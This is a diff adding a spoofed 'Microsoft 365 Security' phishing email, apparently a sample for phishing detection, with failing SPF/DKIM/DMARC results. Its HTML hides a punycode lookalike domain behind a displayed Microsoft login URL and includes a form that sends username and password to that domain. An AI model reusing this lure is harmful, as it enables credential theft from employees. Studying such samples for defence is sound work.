@@ -1,0 +1,17 @@
+From: "Microsoft 365 Security" <security@micr0soft-online-login.com>
+To: employee@example.com
+Subject: Unusual sign-in activity detected on your account
+Date: Tue, 10 Sep 2026 14:02:00 +0000
+Message-ID: <m365fake@micr0soft-online-login.com>
+Authentication-Results: mx.example.com; spf=fail smtp.mailfrom=micr0soft-online-login.com; dkim=fail; dmarc=fail
+Content-Type: text/html; charset="UTF-8"
+
+<html><body>
+<p>We detected unusual login activity on your Microsoft 365 account.</p>
+<p>Please confirm your identity to avoid account suspension:</p>
+<p><a href="https://xn--micrsoft-ypb.com/login">https://login.microsoftonline.com</a></p>
+<form action="https://xn--micrsoft-ypb.com/collect" method="post">
+<input type="text" name="username" placeholder="Email">
+<input type="password" name="password" placeholder="Password">
+</form>
+</body></html>
